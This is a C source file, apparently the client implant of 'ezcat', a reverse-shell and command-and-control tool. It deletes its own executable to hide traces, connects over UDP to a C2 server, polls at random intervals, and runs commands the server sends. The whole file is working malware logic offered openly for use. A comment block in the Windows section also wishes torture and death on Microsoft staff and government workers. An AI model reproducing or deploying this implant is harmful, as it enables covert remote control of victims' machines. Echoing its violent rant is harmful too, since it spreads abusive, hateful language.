// clang-format off

/*
 *  ezcat | easy reverse shell handler
 *  written by ngn (https://ngn.tf) (2024)
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 */

// clang-format on

#ifdef _WIN32
// fuck you windows fuck you shit OS fuck windows fuck microsoft I fucking hate windows
// I hope microsoft goes bankrupt and everybody ever worked for microsoft gets tortured
// for the rest of their life fuck capitalism and all of it supporters also fuck all
// the "1st" world countries that manipulate and control their people like pupets
// I hope people working for those goverments also fucking die fuck the world fuck
// everything I fucking hope an astreoid crashes to the earth and we all fucking die

// anyway where was I?
// oh - windows specific headers

// make sure clang doesnt place windows.h before winsock2.h
// clang-format off
// yes winsock2 needs to be included before windows.h
#include <winsock2.h>
#include <windows.h>
// clang-format on 
#else
// linux specific headers
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#endif
#include <errno.h>
#include <signal.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "client.h"
#include "config.h"
#include "log.h"
#include "util.h"

#define SLEEP_MAX 10
#define SLEEP_MIN 3

static struct sockaddr *addrp;
static int              sockfd;

bool loop() {
  res_t res;

  client_request(sockfd, addrp, REQ_WORK, "Anything to do?");
  client_recv(sockfd, addrp, &res);

  switch (res.code) {
  // there is no work to do
  case RES_NOTNOW:
    break;

  // server is requesting for client info
  case RES_INFO:
    debug("new work: info");
    client_info(sockfd, addrp);
    break;

  case RES_RUN:
    debug("new work: run");
    client_run(sockfd, addrp, res.arg);
    break;

  case RES_KILL:
    debug("new work: kill");
    client_kill(sockfd, addrp);
    break;

  case RES_FAIL:
    debug("got failure response code, will try to register again");
    strcpy(session, ID);
    client_register(sockfd, addrp);
    break;

  case RES_OK:
    debug("received OK response code, probably a work didn't handle it correctly");
    break;

  // unknown response
  default:
    debug("unknown response code: %c", res.code);
    break;
  }

  return true;
}

void end(int sig) {
  if (sig == SIGSEGV)
    debug("received segfault");

  close(sockfd);
#ifdef _WIN32
  WSACleanup();
#endif
  exit(1);
}

int main(int argc, char **argv) {
  // used for cleaning up the program
#ifndef _WIN32
  signal(SIGTRAP, end);
  signal(SIGKILL, end);
#endif
  signal(SIGSEGV, end);
  signal(SIGINT, end);

  // setup inital vars, seed the pseudo rng
  int ret = EXIT_FAILURE;
  srand(time(NULL));

  // self delete
#ifdef _WIN32
  HANDLE shandle = CreateFile(argv[0], DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if(INVALID_HANDLE_VALUE == shandle){
    debug("failed to get handle for self");
    goto cont;
  }

  FILE_RENAME_INFO rename_info;
  wchar_t *name = L":lmao";
  ssize_t rename_size = sizeof(rename_info)+sizeof(name);

  bzero(&rename_info, sizeof(rename_info));

  rename_info.FileNameLength = sizeof(name);
  memcpy(rename_info.FileName, name, sizeof(name));

  if(SetFileInformationByHandle(shandle, FileRenameInfo, &rename_info, rename_size)==0){
    debug("failed to set rename info for self");
    CloseHandle(shandle);
    goto cont;
  }

  CloseHandle(shandle);
  
  shandle = CreateFile(argv[0], DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if(INVALID_HANDLE_VALUE == shandle){
    debug("failed to get handle for self");
    goto cont;
  }

  FILE_DISPOSITION_INFO del_info;
  bzero(&del_info, sizeof(del_info));
  del_info.DeleteFile = true;

  if(SetFileInformationByHandle(shandle, FileDispositionInfo, &del_info, sizeof(del_info))==0){
    debug("failed to set disposition info for self");
    CloseHandle(shandle);
    goto cont;
  }

  CloseHandle(shandle);
#else
  if(unlink(argv[0])<=0){
    debug("failed to unlink self");
    goto cont;
  }
#endif

cont:
#ifdef _WIN32
  // apperantly we need this to init winsock
  // "The WSAStartup function initiates use of the Winsock DLL by a process."
  WSADATA wsa_data;
  if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != NO_ERROR) {
    debug("failed to initiate winsock");
    return EXIT_FAILURE;
  }
#endif

  // create and setup the socket
  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sockfd == -1) {
    debug("failed to create a socket: %s", strerror(errno));
    return EXIT_FAILURE;
  }

  if (!client_setup_socket(sockfd))
    goto end;

  // connect to the C2 server
  struct sockaddr_in addr;
  addrp = (struct sockaddr *)&addr;
  bzero(&addr, sizeof(addr));

  struct hostent *host;
  host = gethostbyname(SERVER_ADDRESS); // yes I know its deprecated - now stfu and ky$ thx

  if (host->h_addrtype != AF_INET) {
    debug("bad addrtype for host");
    goto end;
  }

  if (host->h_addr_list[0] == NULL) {
    debug("failed to resolve host");
    goto end;
  }

  addr.sin_addr.s_addr = *(long *)(host->h_addr_list[0]);
  addr.sin_family      = AF_INET;
  addr.sin_port        = htons(SERVER_PORT);

  if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    debug("failed to connect: %s", strerror(errno));
    goto end;
  }

  // first we should register
  // during registeration session = id
  strcpy(session, ID);
  if (!client_register(sockfd, addrp))
    return false;

  while (true) {
    if (!loop())
      break;
    sleep(randint(SLEEP_MIN, SLEEP_MAX));
  }

  // cleanup and return
  ret = EXIT_SUCCESS;

end:
  close(sockfd);
#ifdef _WIN32
  WSACleanup();
#endif
  return ret;
}
